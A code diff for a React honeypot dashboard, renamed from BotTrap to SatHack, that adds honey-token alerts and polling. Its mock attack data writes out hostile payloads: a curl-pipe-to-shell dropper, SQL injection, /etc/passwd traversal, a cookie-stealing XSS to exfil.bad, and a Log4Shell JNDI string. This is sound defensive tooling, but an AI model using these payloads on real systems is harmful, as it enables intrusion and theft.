@@ -26,14 +26,10 @@ import {
   Radio,
 } from 'lucide-react';
 import { SEVERITY_META, COLORS, PIE_COLORS } from './theme.js';
-import logoImg from './styles/illuminati_ai_logo.svg.png';
 
 // ============================================================================
 // DESIGN TOKENS & CONSTANTS ("Dark Chromatic" Precision Engineering System)
 // ============================================================================
-
-const USE_MOCK = import.meta.env?.VITE_USE_MOCK === 'true';
-const API_BASE = import.meta.env?.VITE_API_URL || '';
 
 const ATTACK_TYPES = [
   'Honey-Token Used',
@@ -55,10 +51,82 @@ const DECOY_ENDPOINTS = [
 
 const HONEYPOT_NODE = {
   id: 'IN-NODE-01',
-  name: 'BotTrap Sensor (Mumbai, IN)',
+  name: 'SatHack Sensor (Mumbai, IN)',
   lat: 19.076,
   lon: 72.8777,
 };
+
+const API_BASE = import.meta.env?.VITE_API_BASE || '';
+const USE_MOCK = import.meta.env?.VITE_USE_MOCK === 'true';
+
+// ============================================================================
+// MOCK HONEY-TOKENS DATA (For VITE_USE_MOCK=true or offline standalone preview)
+// ============================================================================
+
+function buildMockHoneyTokens() {
+  const now = Date.now();
+  const twoMinAgo = new Date(now - 2 * 60 * 1000).toISOString();
+  const fourMinAgo = new Date(now - 4 * 60 * 1000).toISOString();
+  const tenMinAgo = new Date(now - 10 * 60 * 1000).toISOString();
+
+  return [
+    {
+      id: 103,
+      created_at: fourMinAgo,
+      token_masked: 'bt_live_98a7••••',
+      kind: 'api_key',
+      issued_to_ip: '203.0.113.7',
+      issued_on_path: '/.env',
+      status: 'used',
+      used_count: 1,
+      first_used_at: twoMinAgo,
+      last_used_at: twoMinAgo,
+      used_by_ip: '203.0.113.7',
+      used_on_path: '/admin/login',
+      seconds_to_use: 87,
+    },
+    {
+      id: 102,
+      created_at: fourMinAgo,
+      token_masked: 'x9K2mP7qL4vR••••',
+      kind: 'password',
+      issued_to_ip: '203.0.113.7',
+      issued_on_path: '/.env',
+      status: 'issued',
+      used_count: 0,
+      first_used_at: null,
+      last_used_at: null,
+      used_by_ip: null,
+      used_on_path: null,
+      seconds_to_use: null,
+    },
+    {
+      id: 101,
+      created_at: tenMinAgo,
+      token_masked: 'bt_live_4c1e••••',
+      kind: 'api_key',
+      issued_to_ip: '198.51.100.24',
+      issued_on_path: '/api/v1/config',
+      status: 'issued',
+      used_count: 0,
+      first_used_at: null,
+      last_used_at: null,
+      used_by_ip: null,
+      used_on_path: null,
+      seconds_to_use: null,
+    },
+  ];
+}
+
+function buildMockTokenStats() {
+  return {
+    issued: 12,
+    used: 2,
+    readers: 9,
+    avg_seconds_to_use: 87,
+    last_used_at: new Date(Date.now() - 2 * 60 * 1000).toISOString(),
+  };
+}
 
 // ============================================================================
 // REALISTIC THREAT INTELLIGENCE SEED DATA & GENERATOR
@@ -83,8 +151,28 @@ const THREAT_ACTORS = [
 
 const ATTACK_TEMPLATES = [
   {
+    attackType: 'Honey-Token Used',
+    severity: 'CRITICAL',
+    source: 'honey_token',
+    mitreId: 'T1078',
+    mitreName: 'Valid Accounts',
+    mitreTactic: 'Initial Access',
+    ruleId: 'SH-CANARY-000',
+    method: 'POST',
+    port: 443,
+    targetPath: '/admin/login',
+    payload: 'username=admin&password=bt_live_98a7••••',
+    rawRequest: (ip, path, payload) =>
+      `POST ${path} HTTP/1.1\nHost: decoy-01.sathack.internal\nX-Forwarded-For: ${ip}\nUser-Agent: curl/8.5.0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: ${payload.length}\n\n${payload}`,
+    aiSummary: 'Used the fake api_key leaked at /.env 87s earlier. The attacker read the leak and tried it.',
+    aiIntent: 'Human operator extracted decoy credentials from /.env and attempted authenticated administrative login.',
+    confidence: 100,
+    mitigationType: 'nginx',
+  },
+  {
     attackType: 'Command Injection / RCE',
     severity: 'CRITICAL',
+    source: 'rules',
     mitreId: 'T1059',
     mitreName: 'Command & Scripting Interpreter',
     mitreTactic: 'Execution',
@@ -94,7 +182,7 @@ const ATTACK_TEMPLATES = [
     targetPath: '/api/v1/login',
     payload: 'username=admin;curl -s http://185.220.101.42/dropper.sh | sh&password=x',
     rawRequest: (ip, path, payload) =>
-      `POST ${path} HTTP/1.1\nHost: decoy-01.bottrap.internal\nX-Forwarded-For: ${ip}\nUser-Agent: Mozilla/5.0 (compatible; zgrab/0.x)\nContent-Type: application/x-www-form-urlencoded\nContent-Length: ${payload.length}\n\n${payload}`,
+      `POST ${path} HTTP/1.1\nHost: decoy-01.sathack.internal\nX-Forwarded-For: ${ip}\nUser-Agent: Mozilla/5.0 (compatible; zgrab/0.x)\nContent-Type: application/x-www-form-urlencoded\nContent-Length: ${payload.length}\n\n${payload}`,
     aiSummary: 'Remote shell dropper invocation attempting to fetch and execute an unverified second-stage ELF binary directly via POSIX sh pipe.',
     aiIntent: 'Initial foothold establishment and Mirai/botnet implant deployment.',
     confidence: 98,
@@ -103,6 +191,7 @@ const ATTACK_TEMPLATES = [
   {
     attackType: 'SQL Injection',
     severity: 'CRITICAL',
+    source: 'rules',
     mitreId: 'T1190',
     mitreName: 'Exploit Public-Facing Application',
     mitreTactic: 'Initial Access',
@@ -112,7 +201,7 @@ const ATTACK_TEMPLATES = [
     targetPath: '/admin',
     payload: "user=admin' UNION SELECT 1,username,password_hash,email FROM users-- -&pass=123",
     rawRequest: (ip, path, payload) =>
-      `POST ${path} HTTP/1.1\nHost: decoy-01.bottrap.internal\nX-Real-IP: ${ip}\nUser-Agent: sqlmap/1.8.4#stable (https://sqlmap.org)\nContent-Type: application/x-www-form-urlencoded\n\n${payload}`,
+      `POST ${path} HTTP/1.1\nHost: decoy-01.sathack.internal\nX-Real-IP: ${ip}\nUser-Agent: sqlmap/1.8.4#stable (https://sqlmap.org)\nContent-Type: application/x-www-form-urlencoded\n\n${payload}`,
     aiSummary: 'Automated UNION-based SQL injection signature matching sqlmap fingerprint, targeting credential table exfiltration on /admin.',
     aiIntent: 'Database schema enumeration and administrative credential dumping.',
     confidence: 97,
@@ -121,6 +210,7 @@ const ATTACK_TEMPLATES = [
   {
     attackType: 'Path Traversal',
     severity: 'HIGH',
+    source: 'rules',
     mitreId: 'T1083',
     mitreName: 'File and Directory Discovery',
     mitreTactic: 'Discovery',
@@ -129,8 +219,8 @@ const ATTACK_TEMPLATES = [
     port: 443,
     targetPath: '/.env',
     payload: 'GET /../../../../etc/passwd?file=..%2f..%2f.env HTTP/1.1',
-    rawRequest: (ip, path, payload) =>
-      `GET ${path}?debug=../../../../etc/passwd HTTP/1.1\nHost: decoy-01.bottrap.internal\nX-Forwarded-For: ${ip}\nUser-Agent: Nuclei - Open-source project (github.com/projectdiscovery/nuclei)\nAccept: */*\nConnection: close`,
+    rawRequest: (ip, path) =>
+      `GET ${path}?debug=../../../../etc/passwd HTTP/1.1\nHost: decoy-01.sathack.internal\nX-Forwarded-For: ${ip}\nUser-Agent: Nuclei - Open-source project (github.com/projectdiscovery/nuclei)\nAccept: */*\nConnection: close`,
     aiSummary: 'Directory traversal and environment secret harvesting probe using encoded relative path sequences to read local system files.',
     aiIntent: 'Extract AWS/DB credentials from .env or local user accounts from /etc/passwd.',
     confidence: 94,
@@ -139,6 +229,7 @@ const ATTACK_TEMPLATES = [
   {
     attackType: 'SSH Brute Force',
     severity: 'HIGH',
+    source: 'rules',
     mitreId: 'T1110',
     mitreName: 'Brute Force',
     mitreTactic: 'Credential Access',
@@ -148,7 +239,7 @@ const ATTACK_TEMPLATES = [
     targetPath: 'SSH:22',
     payload: 'user=root auth=password pass="admin2026!" (attempt #47/min)',
     rawRequest: (ip, path, payload) =>
-      `[SSH-2.0-OpenSSH_8.9p1 BotTrap-Tarpit]\nSRC=${ip}:51842 DST=10.0.4.12:22\nCLIENT_BANNER: SSH-2.0-libssh2_1.10.0\nAUTH_METHOD: password\nPAYLOAD: ${payload}\nTARPIT_DELAY: 4200ms`,
+      `[SSH-2.0-OpenSSH_8.9p1 SatHack-Tarpit]\nSRC=${ip}:51842 DST=10.0.4.12:22\nCLIENT_BANNER: SSH-2.0-libssh2_1.10.0\nAUTH_METHOD: password\nPAYLOAD: ${payload}\nTARPIT_DELAY: 4200ms`,
     aiSummary: 'High-velocity dictionary attack against SSH daemon port 22 using automated libssh2 spray worker targeting privileged root account.',
     aiIntent: 'Gain interactive shell access for cryptomining or lateral proxy pivoting.',
     confidence: 96,
@@ -157,6 +248,7 @@ const ATTACK_TEMPLATES = [
   {
     attackType: 'Credential Stuffing',
     severity: 'MEDIUM',
+    source: 'rules',
     mitreId: 'T1078',
     mitreName: 'Valid Accounts',
     mitreTactic: 'Defense Evasion',
@@ -166,7 +258,7 @@ const ATTACK_TEMPLATES = [
     targetPath: '/wp-login.php',
     payload: 'log=wp_admin&pwd=Summer2025!@#&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F',
     rawRequest: (ip, path, payload) =>
-      `POST ${path} HTTP/1.1\nHost: decoy-01.bottrap.internal\nX-Forwarded-For: ${ip}\nUser-Agent: python-requests/2.31.0\nContent-Type: application/x-www-form-urlencoded\n\n${payload}`,
+      `POST ${path} HTTP/1.1\nHost: decoy-01.sathack.internal\nX-Forwarded-For: ${ip}\nUser-Agent: python-requests/2.31.0\nContent-Type: application/x-www-form-urlencoded\n\n${payload}`,
     aiSummary: 'Automated credential replay against WordPress authentication decoy using leaked corporate password list patterns.',
     aiIntent: 'Compromise CMS admin panel to upload webshell or inject SEO spam.',
     confidence: 89,
@@ -175,6 +267,7 @@ const ATTACK_TEMPLATES = [
   {
     attackType: 'SQL Injection',
     severity: 'HIGH',
+    source: 'rules',
     mitreId: 'T1190',
     mitreName: 'Exploit Public-Facing Application',
     mitreTactic: 'Initial Access',
@@ -184,7 +277,7 @@ const ATTACK_TEMPLATES = [
     targetPath: '/api/v1/login',
     payload: "id=1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- -",
     rawRequest: (ip, path, payload) =>
-      `GET ${path}?${encodeURIComponent(payload)} HTTP/1.1\nHost: decoy-01.bottrap.internal\nX-Real-IP: ${ip}\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36\nAccept: application/json`,
+      `GET ${path}?${encodeURIComponent(payload)} HTTP/1.1\nHost: decoy-01.sathack.internal\nX-Real-IP: ${ip}\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36\nAccept: application/json`,
     aiSummary: 'Time-based blind SQL injection probe using MySQL SLEEP(5) oracle to confirm injectable query parameter without visible error output.',
     aiIntent: 'Confirm blind SQLi vulnerability for automated boolean data extraction.',
     confidence: 93,
@@ -193,6 +286,7 @@ const ATTACK_TEMPLATES = [
   {
     attackType: 'XSS',
     severity: 'MEDIUM',
+    source: 'rules',
     mitreId: 'T1189',
     mitreName: 'Drive-by Compromise',
     mitreTactic: 'Initial Access',
@@ -202,7 +296,7 @@ const ATTACK_TEMPLATES = [
     targetPath: '/admin',
     payload: 'q=<svg/onload=fetch("https://exfil.bad/c?d="+btoa(document.cookie))>',
     rawRequest: (ip, path, payload) =>
-      `GET ${path}?${payload} HTTP/1.1\nHost: decoy-01.bottrap.internal\nX-Forwarded-For: ${ip}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0\nAccept: text/html`,
+      `GET ${path}?${payload} HTTP/1.1\nHost: decoy-01.sathack.internal\nX-Forwarded-For: ${ip}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0\nAccept: text/html`,
     aiSummary: 'Reflected/Stored XSS vector utilizing SVG onload event handler designed to exfiltrate admin session cookies to external collector.',
     aiIntent: 'Session hijacking of SOC/admin operators reviewing dashboard logs.',
     confidence: 87,
@@ -211,6 +305,7 @@ const ATTACK_TEMPLATES = [
   {
     attackType: 'Path Traversal',
     severity: 'LOW',
+    source: 'rules',
     mitreId: 'T1083',
     mitreName: 'File and Directory Discovery',
     mitreTactic: 'Discovery',
@@ -220,7 +315,7 @@ const ATTACK_TEMPLATES = [
     targetPath: '/.env',
     payload: 'GET /.env.production HTTP/1.1 (automated cloud secret scanner)',
     rawRequest: (ip, path) =>
-      `GET ${path}.production HTTP/1.1\nHost: decoy-01.bottrap.internal\nX-Forwarded-For: ${ip}\nUser-Agent: Go-http-client/1.1\nAccept-Encoding: gzip`,
+      `GET ${path}.production HTTP/1.1\nHost: decoy-01.sathack.internal\nX-Forwarded-For: ${ip}\nUser-Agent: Go-http-client/1.1\nAccept-Encoding: gzip`,
     aiSummary: 'Opportunistic internet-wide scanner checking for exposed dotenv configuration files and cloud API keys.',
     aiIntent: 'Reconnaissance for misconfigured webroot secrets (AWS/Stripe/SMTP).',
     confidence: 84,
@@ -229,6 +324,7 @@ const ATTACK_TEMPLATES = [
   {
     attackType: 'Command Injection / RCE',
     severity: 'CRITICAL',
+    source: 'rules',
     mitreId: 'T1059',
     mitreName: 'Command & Scripting Interpreter',
     mitreTactic: 'Execution',
@@ -238,7 +334,7 @@ const ATTACK_TEMPLATES = [
     targetPath: '/wp-login.php',
     payload: '${jndi:ldap://193.142.146.35:1389/Basic/Command/Base64/d2dldCBodHRwOi8v...}',
     rawRequest: (ip, path, payload) =>
-      `POST ${path} HTTP/1.1\nHost: decoy-01.bottrap.internal\nX-Forwarded-For: ${ip}\nUser-Agent: ${payload}\nX-Api-Version: ${payload}\nContent-Length: 0`,
+      `POST ${path} HTTP/1.1\nHost: decoy-01.sathack.internal\nX-Forwarded-For: ${ip}\nUser-Agent: ${payload}\nX-Api-Version: ${payload}\nContent-Length: 0`,
     aiSummary: 'Log4Shell (CVE-2021-44228) JNDI LDAP lookup injection embedded in HTTP User-Agent and X-Api-Version headers.',
     aiIntent: 'Trigger remote class loading and arbitrary Java deserialization RCE.',
     confidence: 99,
@@ -247,6 +343,7 @@ const ATTACK_TEMPLATES = [
   {
     attackType: 'SSH Brute Force',
     severity: 'LOW',
+    source: 'rules',
     mitreId: 'T1110',
     mitreName: 'Brute Force',
     mitreTactic: 'Credential Access',
@@ -256,7 +353,7 @@ const ATTACK_TEMPLATES = [
     targetPath: 'SSH:22',
     payload: 'user=ubuntu auth=publickey key_fp=SHA256:9xK2...m8P (probe)',
     rawRequest: (ip, path, payload) =>
-      `[SSH-2.0-OpenSSH_8.9p1 BotTrap-Tarpit]\nSRC=${ip}:44120 DST=10.0.4.12:22\nCLIENT_BANNER: SSH-2.0-Go\nPAYLOAD: ${payload}`,
+      `[SSH-2.0-OpenSSH_8.9p1 SatHack-Tarpit]\nSRC=${ip}:44120 DST=10.0.4.12:22\nCLIENT_BANNER: SSH-2.0-Go\nPAYLOAD: ${payload}`,
     aiSummary: 'Low-rate SSH key enumeration probe checking default cloud image username (ubuntu) availability.',
     aiIntent: 'Identify active SSH targets prior to credential stuffing campaign.',
     confidence: 78,
@@ -325,8 +422,9 @@ function generateInitialDataset(count = 32) {
 // ============================================================================
 
 function formatTimeHMS(iso) {
+  if (!iso) return '—';
   const d = new Date(iso);
-  return d.toTimeString().slice(0, 8);
+  return Number.isNaN(d.getTime()) ? '—' : d.toTimeString().slice(0, 8);
 }
 
 function formatFullTimestamp(iso) {
@@ -341,8 +439,70 @@ function projectLonLat(lon, lat, width = 800, height = 380) {
   return [x, y];
 }
 
+function usePolling(endpoint, { enabled = true, intervalMs = 3500, mockFactory } = {}) {
+  const [data, setData] = useState(null);
+  const [loading, setLoading] = useState(true);
+  const [error, setError] = useState(null);
+  const mockRef = useRef(mockFactory);
+  mockRef.current = mockFactory;
+
+  useEffect(() => {
+    let cancelled = false;
+
+    const load = async () => {
+      if (USE_MOCK) {
+        if (!cancelled) {
+          setData(mockRef.current ? mockRef.current() : null);
+          setError(null);
+          setLoading(false);
+        }
+        return;
+      }
+
+      try {
+        const res = await fetch(`${API_BASE}${endpoint}`, {
+          headers: { Accept: 'application/json' },
+        });
+        if (!res.ok) throw new Error(`HTTP ${res.status}`);
+        const json = await res.json();
+        if (!cancelled) {
+          setData(json);
+          setError(null);
+          setLoading(false);
+        }
+      } catch (err) {
+        if (!cancelled) {
+          // Graceful fallback to mock data when running frontend standalone without API server
+          if (mockRef.current) {
+            setData((prev) => prev ?? mockRef.current());
+            setError(null);
+          } else {
+            setError(err?.message || 'Failed to fetch');
+          }
+          setLoading(false);
+        }
+      }
+    };
+
+    load();
+    if (!enabled) {
+      return () => {
+        cancelled = true;
+      };
+    }
+
+    const timer = setInterval(load, intervalMs);
+    return () => {
+      cancelled = true;
+      clearInterval(timer);
+    };
+  }, [endpoint, enabled, intervalMs]);
+
+  return { data, loading, error };
+}
+
 // ============================================================================
-// ERROR BOUNDARY (Mirrors BotTrap/frontend/src/lib/ErrorBoundary.jsx)
+// ERROR BOUNDARY (Mirrors SatHack-main/frontend/src/lib/ErrorBoundary.jsx)
 // ============================================================================
 
 class ErrorBoundary extends React.Component {
@@ -381,25 +541,15 @@ class ErrorBoundary extends React.Component {
 // ============================================================================
 
 const WORLD_CONTINENTS = [
-  // North America
   'M 85,55 L 145,42 L 210,48 L 245,78 L 235,112 L 205,135 L 185,155 L 168,175 L 155,165 L 138,145 L 112,120 L 95,90 Z',
-  // Greenland
   'M 250,24 L 298,20 L 315,44 L 285,66 L 260,55 Z',
-  // South America
   'M 218,190 L 252,195 L 288,225 L 296,258 L 272,298 L 254,335 L 236,342 L 228,305 L 218,255 L 208,218 Z',
-  // Europe
   'M 378,52 L 420,44 L 465,50 L 478,78 L 456,105 L 432,112 L 405,116 L 385,108 L 372,92 L 384,74 Z',
-  // UK & Ireland
   'M 366,74 L 376,72 L 378,86 L 367,88 Z',
-  // Africa
   'M 374,126 L 428,124 L 468,142 L 494,178 L 486,216 L 466,258 L 444,292 L 426,288 L 414,244 L 398,208 L 370,184 L 364,152 Z',
-  // Middle East & Asia
   'M 468,78 L 535,52 L 625,46 L 705,58 L 732,84 L 702,118 L 675,148 L 642,168 L 615,186 L 592,165 L 570,185 L 552,160 L 525,158 L 496,144 L 474,120 Z',
-  // Japan / East Asia Islands
   'M 692,102 L 708,96 L 714,114 L 698,124 Z',
-  // Southeast Asia / Indonesia
   'M 612,196 L 648,198 L 674,212 L 656,222 L 620,214 Z',
-  // Australia
   'M 656,246 L 712,242 L 738,266 L 730,302 L 698,312 L 664,296 L 650,272 Z',
 ];
 
@@ -442,12 +592,12 @@ function Navbar({
       <div className="max-w-[1600px] mx-auto px-4 sm:px-6 h-14 flex items-center justify-between gap-3">
         {/* Brand Mark */}
         <div className="flex items-center gap-3 min-w-0">
-          <div className="w-8 h-8 rounded-[4px] bg-[#14171D] border border-[#2E3543] flex items-center justify-center shrink-0 overflow-hidden p-0.5">
-            <img src={logoImg} alt="BotTrap Logo" className="w-full h-full object-contain" />
+          <div className="w-7 h-7 rounded-[4px] bg-[#14171D] border border-[#2E3543] flex items-center justify-center shrink-0">
+            <Shield className="w-4 h-4 text-[#F0F2F5]" strokeWidth={1.75} />
           </div>
           <div className="flex items-center gap-2.5 min-w-0">
             <span className="font-semibold tracking-[0.14em] text-sm text-[#F0F2F5]">
-              BOTTRAP
+              SATHACK
             </span>
             <span className="hidden sm:inline-flex items-center px-2 py-0.5 text-[10px] font-mono tracking-wider text-[#8A93A2] bg-[#0E1014] border border-[#1E232C] rounded-[4px]">
               HONEYPOT TELEMETRY v2.4
@@ -540,7 +690,7 @@ function Navbar({
           {/* Architecture / About Button */}
           <button
             onClick={onOpenAbout}
-            title="BotTrap Architecture & Pipeline"
+            title="SatHack Architecture & Pipeline"
             className="h-8 w-8 sm:w-auto sm:px-2.5 rounded-[4px] bg-[#0E1014] border border-[#1E232C] hover:border-[#2E3543] text-xs text-[#8A93A2] hover:text-[#F0F2F5] flex items-center justify-center gap-1.5 transition-colors"
           >
             <Info className="w-3.5 h-3.5" />
@@ -553,6 +703,57 @@ function Navbar({
 }
 
 // ============================================================================
+// COMPONENT 1B: HONEY-TOKEN ALERT BANNER (Shown when used within last 10 min)
+// ============================================================================
+
+const TEN_MINUTES_MS = 10 * 60 * 1000;
+
+function HoneyTokenAlert({ tokens = [], onInspectToken }) {
+  const recent = useMemo(() => {
+    const now = Date.now();
+    return tokens.find((t) => {
+      if (!t?.last_used_at) return false;
+      const ts = Date.parse(t.last_used_at);
+      return !Number.isNaN(ts) && now - ts <= TEN_MINUTES_MS;
+    });
+  }, [tokens]);
+
+  if (!recent) return null;
+
+  const secs = recent.seconds_to_use ?? 0;
+
+  return (
+    <div
+      role="alert"
+      className="banner banner-critical bg-[#E5484D]/15 border border-[#E5484D]/55 rounded-[4px] px-4 py-2.5 flex flex-wrap items-center justify-between gap-3"
+    >
+      <div className="flex items-center gap-2.5 text-xs font-mono text-[#F0F2F5]">
+        <AlertTriangle className="w-4 h-4 text-[#E5484D] shrink-0 animate-pulse" />
+        <span>
+          <strong className="text-[#E5484D] tracking-wide">
+            STOLEN HONEY-TOKEN USED:
+          </strong>{' '}
+          an attacker used the key leaked at{' '}
+          <code className="px-1.5 py-0.5 bg-[#08090B] border border-[#E5484D]/40 rounded-[3px] text-[#F0F2F5]">
+            {recent.issued_on_path}
+          </code>{' '}
+          after <strong className="text-[#F0F2F5] tabular-nums">{secs}</strong> seconds.
+        </span>
+      </div>
+
+      {onInspectToken && (
+        <button
+          onClick={() => onInspectToken(recent)}
+          className="px-2.5 py-1 text-[11px] font-mono bg-[#08090B] hover:bg-[#14171D] border border-[#E5484D]/50 rounded-[3px] text-[#F0F2F5] transition-colors"
+        >
+          Filter {recent.used_by_ip || recent.issued_to_ip}
+        </button>
+      )}
+    </div>
+  );
+}
+
+// ============================================================================
 // COMPONENT 2: THREAT LEVEL BANNER
 // ============================================================================
 
@@ -561,11 +762,12 @@ function ThreatLevelBanner({ events, onSelectPath }) {
     const recentWindow = events.slice(0, 20);
     const critCount = recentWindow.filter((e) => e.severity === 'CRITICAL').length;
     const highCount = recentWindow.filter((e) => e.severity === 'HIGH').length;
+    const hasHoneyHit = recentWindow.some((e) => e.source === 'honey_token');
     const ratio = recentWindow.length ? (critCount * 2 + highCount) / (recentWindow.length * 2) : 0;
 
     let level = 'LOW';
     let color = '#2EB872';
-    if (ratio >= 0.48 || critCount >= 7) {
+    if (hasHoneyHit || ratio >= 0.48 || critCount >= 7) {
       level = 'CRITICAL';
       color = '#E5484D';
     } else if (ratio >= 0.34 || critCount >= 4) {
@@ -576,7 +778,6 @@ function ThreatLevelBanner({ events, onSelectPath }) {
       color = '#E5A93C';
     }
 
-    // Estimate events per minute over last 15 minutes
     const now = Date.now();
     const last15Min = events.filter((e) => now - e.epoch <= 15 * 60 * 1000).length;
     const ratePerMin = Math.max(0.4, last15Min / 15).toFixed(1);
@@ -639,10 +840,18 @@ function ThreatLevelBanner({ events, onSelectPath }) {
 }
 
 // ============================================================================
-// COMPONENT 3: STAT CARDS (4 Compact KPI Cards)
+// COMPONENT 3: STAT CARDS (4 Base KPIs + Optional "Honey-tokens caught" KPI)
 // ============================================================================
 
-function StatCards({ events, allEvents, activeSeverity, onToggleCritical }) {
+function StatCards({
+  events,
+  allEvents,
+  activeSeverity,
+  onToggleCritical,
+  honeyTokensCaught,
+  activeAttackType,
+  onToggleHoneyTokens,
+}) {
   const stats = useMemo(() => {
     const uniqueIps = new Set(events.map((e) => e.ip)).size;
     const criticalHits = events.filter((e) => e.severity === 'CRITICAL').length;
@@ -661,9 +870,15 @@ function StatCards({ events, allEvents, activeSeverity, onToggleCritical }) {
   }, [events, allEvents]);
 
   const isCritActive = activeSeverity === 'CRITICAL';
+  const isHoneyActive = activeAttackType === 'Honey-Token Used';
+  const showHoneyCard = honeyTokensCaught !== undefined && honeyTokensCaught !== null;
 
   return (
-    <div className="grid grid-cols-2 lg:grid-cols-4 gap-3">
+    <div
+      className={`grid grid-cols-2 gap-3 ${
+        showHoneyCard ? 'md:grid-cols-3 lg:grid-cols-5' : 'lg:grid-cols-4'
+      }`}
+    >
       {/* KPI 1: Total Captured Events */}
       <div className="bg-[#0E1014] border border-[#1E232C] rounded-[4px] p-3.5 flex flex-col justify-between">
         <div className="flex items-center justify-between">
@@ -747,6 +962,38 @@ function StatCards({ events, allEvents, activeSeverity, onToggleCritical }) {
           </span>
         </div>
       </div>
+
+      {/* KPI 5 (Optional): Honey-tokens caught */}
+      {showHoneyCard && (
+        <button
+          onClick={onToggleHoneyTokens}
+          className={`text-left bg-[#0E1014] rounded-[4px] p-3.5 flex flex-col justify-between border transition-colors ${
+            isHoneyActive
+              ? 'border-[#E5484D] bg-[#E5484D]/[0.08]'
+              : 'border-[#1E232C] hover:border-[#E5484D]/50'
+          }`}
+        >
+          <div className="flex items-center justify-between w-full">
+            <span className="text-[11px] font-mono uppercase tracking-wider text-[#8A93A2] flex items-center gap-1.5">
+              Honey-tokens caught
+              {isHoneyActive && (
+                <span className="text-[9px] px-1 py-0.2 bg-[#E5484D]/20 text-[#E5484D] rounded-[2px]">
+                  FILTERED
+                </span>
+              )}
+            </span>
+            <Lock className="w-3.5 h-3.5 text-[#E5484D]" />
+          </div>
+          <div className="mt-2 flex items-baseline justify-between w-full">
+            <span className="text-2xl font-mono font-semibold text-[#E5484D] tabular-nums">
+              {honeyTokensCaught}
+            </span>
+            <span className="text-[11px] font-mono text-[#8A93A2] tabular-nums">
+              canary trips
+            </span>
+          </div>
+        </button>
+      )}
     </div>
   );
 }
@@ -953,7 +1200,6 @@ function AttackMap({ events, activeActor, onSelectActor }) {
           className="w-full h-full block"
           preserveAspectRatio="xMidYMid meet"
         >
-          {/* Subtle Latitude / Longitude Graticule */}
           <g stroke="#14171D" strokeWidth="0.75">
             {[63, 126, 190, 253, 316].map((y) => (
               <line key={`lat-${y}`} x1="0" y1={y} x2="800" y2={y} strokeDasharray="2 4" />
@@ -963,14 +1209,12 @@ function AttackMap({ events, activeActor, onSelectActor }) {
             ))}
           </g>
 
-          {/* Continents Silhouette */}
           <g fill="#12151C" stroke="#1E232C" strokeWidth="1">
             {WORLD_CONTINENTS.map((d, idx) => (
               <path key={idx} d={d} />
             ))}
           </g>
 
-          {/* Animated Attack Arcs */}
           <g fill="none">
             {nodes.map((node) => {
               const [sx, sy] = projectLonLat(node.lon, node.lat);
@@ -982,35 +1226,31 @@ function AttackMap({ events, activeActor, onSelectActor }) {
 
               return (
                 <g key={`arc-${node.ip}`}>
-                  {/* Base hairline path */}
                   <path
                     d={`M ${sx} ${sy} Q ${mx} ${my} ${targetX} ${targetY}`}
                     stroke={sevColor}
                     strokeOpacity={isSelected ? 0.85 : 0.22}
                     strokeWidth={isSelected ? 1.6 : 1}
                   />
-                  {/* Animated telemetry packet dash */}
                   <path
                     d={`M ${sx} ${sy} Q ${mx} ${my} ${targetX} ${targetY}`}
                     stroke={sevColor}
                     strokeOpacity={0.85}
                     strokeWidth={isSelected ? 1.8 : 1.1}
                     strokeDasharray="6 140"
-                    className="bottrap-arc-flow"
+                    className="sathack-arc-flow"
                   />
                 </g>
               );
             })}
           </g>
 
-          {/* Honeypot Destination Sensor Node */}
           <g transform={`translate(${targetX}, ${targetY})`}>
             <circle r="10" fill="#2EB872" fillOpacity="0.12" />
             <circle r="5.5" fill="none" stroke="#2EB872" strokeWidth="1" strokeDasharray="2 2" />
             <circle r="2.8" fill="#2EB872" />
           </g>
 
-          {/* Source Actor Nodes */}
           {nodes.map((node) => {
             const [sx, sy] = projectLonLat(node.lon, node.lat);
             const sevColor = SEVERITY_META[node.maxSeverity].color;
@@ -1036,7 +1276,6 @@ function AttackMap({ events, activeActor, onSelectActor }) {
           })}
         </svg>
 
-        {/* Crisp Floating Tooltip */}
         {hoveredNode && (
           <div
             className="pointer-events-none absolute z-20 bg-[#0E1014] border border-[#2E3543] rounded-[4px] px-3 py-2 shadow-xl text-xs font-mono"
@@ -1082,7 +1321,7 @@ function TimelineChart({ events }) {
   const buckets = useMemo(() => {
     const bucketCount = 12;
     const now = Date.now();
-    const spanMs = 30 * 60 * 1000; // 30 minutes
+    const spanMs = 30 * 60 * 1000;
     const stepMs = spanMs / bucketCount;
 
     const list = Array.from({ length: bucketCount }, (_, i) => {
@@ -1114,7 +1353,7 @@ function TimelineChart({ events }) {
           </h2>
         </div>
         <div className="flex items-center gap-2.5 text-[10px] font-mono text-[#8A93A2]">
-          {(['CRITICAL', 'HIGH', 'MEDIUM', 'LOW']).map((s) => (
+          {['CRITICAL', 'HIGH', 'MEDIUM', 'LOW'].map((s) => (
             <span key={s} className="flex items-center gap-1">
               <span
                 className="w-1.5 h-1.5 rounded-[1px]"
@@ -1128,7 +1367,6 @@ function TimelineChart({ events }) {
 
       <div className="p-4 flex-1 flex flex-col justify-between relative min-h-[220px]">
         <div className="relative h-44 flex items-end gap-1.5 pt-4">
-          {/* Horizontal reference gridlines */}
           <div className="absolute inset-0 flex flex-col justify-between pointer-events-none">
             {[maxTotal, Math.round(maxTotal / 2), 0].map((val, i) => (
               <div key={i} className="flex items-center gap-2 w-full">
@@ -1140,7 +1378,6 @@ function TimelineChart({ events }) {
             ))}
           </div>
 
-          {/* Bars */}
           <div className="relative z-10 flex-1 h-full flex items-end gap-1.5 pl-7">
             {buckets.map((b, idx) => {
               const isHover = hoveredIdx === idx;
@@ -1191,14 +1428,12 @@ function TimelineChart({ events }) {
           </div>
         </div>
 
-        {/* X-Axis Labels */}
         <div className="pl-7 mt-2 flex justify-between text-[10px] font-mono text-[#525B6A] tabular-nums">
           <span>{buckets[0]?.label}</span>
           <span>{buckets[5]?.label}</span>
           <span>{buckets[11]?.label}</span>
         </div>
 
-        {/* Hover Readout Strip */}
         {hoveredIdx !== null && buckets[hoveredIdx] && (
           <div className="absolute top-2 right-3 bg-[#14171D] border border-[#2E3543] rounded-[4px] px-2.5 py-1 text-[11px] font-mono flex items-center gap-2.5 tabular-nums shadow-lg">
             <span className="text-[#8A93A2]">{buckets[hoveredIdx].label}</span>
